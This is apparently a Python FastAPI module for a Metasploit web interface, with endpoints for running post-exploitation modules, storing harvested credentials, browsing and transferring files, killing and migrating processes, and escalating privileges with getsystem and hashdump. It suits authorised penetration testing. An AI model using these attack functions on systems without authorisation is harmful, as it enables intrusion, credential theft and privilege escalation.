from fastapi import APIRouter, HTTPException, Depends, UploadFile, File
from fastapi.responses import Response
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime
import uuid
import os
import json
import base64

from app.core.msf_client import msf_client
from app.api.routes.auth import get_current_active_user

router = APIRouter()

# Credential vault storage
CREDS_FILE = "/tmp/msf_gui_credentials.json"
credentials_db: dict[str, dict] = {}


# Pydantic Models
class Credential(BaseModel):
    username: str
    password: Optional[str] = None
    hash: Optional[str] = None
    hash_type: Optional[str] = None
    domain: Optional[str] = None
    host: Optional[str] = None
    service: Optional[str] = None
    port: Optional[int] = None
    notes: Optional[str] = None
    source: Optional[str] = None  # e.g., "hashdump", "mimikatz", "manual"


class CredentialUpdate(BaseModel):
    username: Optional[str] = None
    password: Optional[str] = None
    hash: Optional[str] = None
    hash_type: Optional[str] = None
    domain: Optional[str] = None
    host: Optional[str] = None
    service: Optional[str] = None
    port: Optional[int] = None
    notes: Optional[str] = None


class RunPostModule(BaseModel):
    module: str
    options: dict = {}


class FileOperation(BaseModel):
    path: str


class ProcessOperation(BaseModel):
    pid: int


# Load/Save credentials
def load_credentials():
    global credentials_db
    if os.path.exists(CREDS_FILE):
        try:
            with open(CREDS_FILE, 'r') as f:
                credentials_db = json.load(f)
        except Exception:
            credentials_db = {}


def save_credentials():
    try:
        with open(CREDS_FILE, 'w') as f:
            json.dump(credentials_db, f, indent=2)
    except Exception as e:
        print(f"Failed to save credentials: {e}")


# Load on module import
load_credentials()


# ==================== Post Modules ====================

@router.get("/modules")
async def list_post_modules(
    platform: Optional[str] = None,
    session_type: Optional[str] = None,
    search: Optional[str] = None,
    user=Depends(get_current_active_user)
):
    """List post-exploitation modules with optional filtering."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        modules = await msf_client.list_modules("post")

        results = []
        for mod in modules:
            # Filter by platform if specified
            if platform:
                # Post modules are organized as: platform/category/name
                # e.g., windows/gather/hashdump, linux/gather/enum_users
                mod_platform = mod.split('/')[0] if '/' in mod else ''
                if platform.lower() not in mod_platform.lower():
                    continue

            # Filter by search query
            if search and search.lower() not in mod.lower():
                continue

            # Parse module path for category
            parts = mod.split('/')
            mod_platform = parts[0] if len(parts) > 0 else 'multi'
            category = parts[1] if len(parts) > 1 else 'general'

            results.append({
                "name": mod,
                "fullname": f"post/{mod}",
                "platform": mod_platform,
                "category": category,
            })

        # Sort by name
        results.sort(key=lambda x: x["name"])

        return {
            "modules": results,
            "count": len(results),
            "platforms": list(set(m["platform"] for m in results)),
            "categories": list(set(m["category"] for m in results)),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/modules/{module_path:path}/info")
async def get_post_module_info(module_path: str, user=Depends(get_current_active_user)):
    """Get detailed information about a post module."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        info = await msf_client.get_module_info("post", module_path)
        return info
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/modules/run")
async def run_post_module(
    request: RunPostModule,
    user=Depends(get_current_active_user)
):
    """Run a post-exploitation module against a session."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        result = await msf_client.run_module("post", request.module, request.options)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== Credential Vault ====================

@router.get("/credentials")
async def list_credentials(
    host: Optional[str] = None,
    service: Optional[str] = None,
    user=Depends(get_current_active_user)
):
    """List all stored credentials."""
    results = list(credentials_db.values())

    if host:
        results = [c for c in results if c.get("host", "").lower() == host.lower()]
    if service:
        results = [c for c in results if c.get("service", "").lower() == service.lower()]

    # Sort by created_at descending
    results.sort(key=lambda x: x.get("created_at", ""), reverse=True)

    return {
        "credentials": results,
        "count": len(results),
        "hosts": list(set(c.get("host", "") for c in credentials_db.values() if c.get("host"))),
        "services": list(set(c.get("service", "") for c in credentials_db.values() if c.get("service"))),
    }


@router.post("/credentials")
async def add_credential(cred: Credential, user=Depends(get_current_active_user)):
    """Add a new credential to the vault."""
    cred_id = str(uuid.uuid4())
    now = datetime.now().isoformat()

    credentials_db[cred_id] = {
        "id": cred_id,
        "username": cred.username,
        "password": cred.password,
        "hash": cred.hash,
        "hash_type": cred.hash_type,
        "domain": cred.domain,
        "host": cred.host,
        "service": cred.service,
        "port": cred.port,
        "notes": cred.notes,
        "source": cred.source,
        "created_at": now,
        "updated_at": now,
    }

    save_credentials()
    return credentials_db[cred_id]


@router.put("/credentials/{cred_id}")
async def update_credential(
    cred_id: str,
    update: CredentialUpdate,
    user=Depends(get_current_active_user)
):
    """Update a credential."""
    if cred_id not in credentials_db:
        raise HTTPException(status_code=404, detail="Credential not found")

    cred = credentials_db[cred_id]
    update_data = update.model_dump(exclude_unset=True)

    for key, value in update_data.items():
        cred[key] = value

    cred["updated_at"] = datetime.now().isoformat()
    save_credentials()

    return cred


@router.delete("/credentials/{cred_id}")
async def delete_credential(cred_id: str, user=Depends(get_current_active_user)):
    """Delete a credential."""
    if cred_id not in credentials_db:
        raise HTTPException(status_code=404, detail="Credential not found")

    del credentials_db[cred_id]
    save_credentials()

    return {"success": True, "message": "Credential deleted"}


@router.delete("/credentials")
async def clear_credentials(user=Depends(get_current_active_user)):
    """Clear all credentials."""
    credentials_db.clear()
    save_credentials()
    return {"success": True, "message": "All credentials cleared"}


# ==================== Meterpreter File Browser ====================

@router.get("/sessions/{session_id}/files")
async def list_files(
    session_id: int,
    path: str = ".",
    user=Depends(get_current_active_user)
):
    """List files in a directory on the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        # Run ls command
        output = await msf_client.session_meterpreter_run_single(session_id, f"ls \"{path}\"")

        files = []
        lines = output.strip().split('\n')

        # Parse ls output (format varies, but typically: Mode Size Type Last modified Name)
        for line in lines:
            line = line.strip()
            if not line or line.startswith('Listing:') or line.startswith('=') or line.startswith('Mode'):
                continue

            parts = line.split()
            if len(parts) >= 5:
                # Try to parse meterpreter ls format
                mode = parts[0]
                size = parts[1]
                file_type = parts[2]
                # Last modified is parts[3] and parts[4] (date time)
                name = ' '.join(parts[5:]) if len(parts) > 5 else parts[-1]

                files.append({
                    "name": name,
                    "type": "directory" if file_type == "dir" or 'd' in mode else "file",
                    "size": int(size) if size.isdigit() else 0,
                    "mode": mode,
                    "modified": f"{parts[3]} {parts[4]}" if len(parts) > 4 else "",
                })

        return {
            "path": path,
            "files": files,
            "count": len(files),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions/{session_id}/files/pwd")
async def get_pwd(session_id: int, user=Depends(get_current_active_user)):
    """Get current working directory."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "pwd")
        return {"path": output.strip()}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/files/download")
async def download_file(
    session_id: int,
    request: FileOperation,
    user=Depends(get_current_active_user)
):
    """Download a file from the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        # Use meterpreter download command
        # First, cat the file to get contents (for smaller files)
        output = await msf_client.session_meterpreter_run_single(
            session_id,
            f"cat \"{request.path}\""
        )

        # Return as base64 encoded
        filename = os.path.basename(request.path)
        return {
            "filename": filename,
            "content": base64.b64encode(output.encode('utf-8', errors='replace')).decode('ascii'),
            "size": len(output),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/files/upload")
async def upload_file(
    session_id: int,
    destination: str,
    file: UploadFile = File(...),
    user=Depends(get_current_active_user)
):
    """Upload a file to the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        # Save uploaded file temporarily
        import tempfile
        content = await file.read()

        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(content)
            tmp_path = tmp.name

        try:
            # Use meterpreter upload command
            dest_path = os.path.join(destination, file.filename)
            output = await msf_client.session_meterpreter_run_single(
                session_id,
                f"upload \"{tmp_path}\" \"{dest_path}\""
            )

            return {
                "success": True,
                "message": output,
                "destination": dest_path,
            }
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== Process Management ====================

@router.get("/sessions/{session_id}/processes")
async def list_processes(session_id: int, user=Depends(get_current_active_user)):
    """List processes on the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "ps")

        processes = []
        lines = output.strip().split('\n')

        # Parse ps output (PID PPID Name Arch Session User Path)
        for line in lines:
            line = line.strip()
            if not line or line.startswith('PID') or line.startswith('=') or line.startswith('Process'):
                continue

            parts = line.split()
            if len(parts) >= 3:
                try:
                    pid = int(parts[0])
                    ppid = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                    name = parts[2] if len(parts) > 2 else "unknown"
                    arch = parts[3] if len(parts) > 3 else ""
                    session = parts[4] if len(parts) > 4 else ""
                    user = parts[5] if len(parts) > 5 else ""
                    path = ' '.join(parts[6:]) if len(parts) > 6 else ""

                    processes.append({
                        "pid": pid,
                        "ppid": ppid,
                        "name": name,
                        "arch": arch,
                        "session": session,
                        "user": user,
                        "path": path,
                    })
                except (ValueError, IndexError):
                    continue

        return {
            "processes": processes,
            "count": len(processes),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/processes/kill")
async def kill_process(
    session_id: int,
    request: ProcessOperation,
    user=Depends(get_current_active_user)
):
    """Kill a process on the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(
            session_id,
            f"kill {request.pid}"
        )
        return {"success": True, "message": output}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/processes/migrate")
async def migrate_process(
    session_id: int,
    request: ProcessOperation,
    user=Depends(get_current_active_user)
):
    """Migrate meterpreter to another process."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(
            session_id,
            f"migrate {request.pid}"
        )
        return {"success": True, "message": output}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== Screenshots ====================

@router.post("/sessions/{session_id}/screenshot")
async def take_screenshot(session_id: int, user=Depends(get_current_active_user)):
    """Take a screenshot from the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        # Run screenshot command
        output = await msf_client.session_meterpreter_run_single(session_id, "screenshot")

        # The screenshot command saves to a file and returns the path
        # We need to read it and return as base64
        # Output usually contains: "Screenshot saved to: /path/to/file.jpeg"

        return {
            "success": True,
            "message": output,
            # In a real implementation, we'd read the file and return it
            # For now, just return the output message
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== System Info ====================

@router.get("/sessions/{session_id}/sysinfo")
async def get_sysinfo(session_id: int, user=Depends(get_current_active_user)):
    """Get system information from the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "sysinfo")

        # Parse sysinfo output
        info = {}
        for line in output.strip().split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                info[key.strip().lower().replace(' ', '_')] = value.strip()

        return info
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions/{session_id}/getuid")
async def get_uid(session_id: int, user=Depends(get_current_active_user)):
    """Get current user on the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "getuid")
        return {"user": output.strip()}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions/{session_id}/getprivs")
async def get_privs(session_id: int, user=Depends(get_current_active_user)):
    """Get current privileges on the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "getprivs")

        privileges = []
        for line in output.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('=') and not line.startswith('Enabled'):
                privileges.append(line)

        return {"privileges": privileges, "count": len(privileges)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== Privilege Escalation ====================

@router.post("/sessions/{session_id}/getsystem")
async def get_system(session_id: int, user=Depends(get_current_active_user)):
    """Attempt to get SYSTEM privileges."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "getsystem")
        success = "got system" in output.lower()
        return {"success": success, "message": output}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/suggest")
async def suggest_exploits(session_id: int, user=Depends(get_current_active_user)):
    """Run local exploit suggester."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        # Run the local_exploit_suggester post module
        result = await msf_client.run_module(
            "post",
            "multi/recon/local_exploit_suggester",
            {"SESSION": str(session_id)}
        )
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== Hashdump ====================

@router.post("/sessions/{session_id}/hashdump")
async def hashdump(session_id: int, user=Depends(get_current_active_user)):
    """Dump password hashes from the target."""
    if not msf_client.connected:
        raise HTTPException(status_code=503, detail="Metasploit RPC not connected")

    try:
        output = await msf_client.session_meterpreter_run_single(session_id, "hashdump")

        hashes = []
        for line in output.strip().split('\n'):
            line = line.strip()
            if ':' in line and not line.startswith('['):
                parts = line.split(':')
                if len(parts) >= 4:
                    hashes.append({
                        "username": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "ntlm_hash": parts[3],
                    })

        return {"hashes": hashes, "count": len(hashes), "raw": output}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
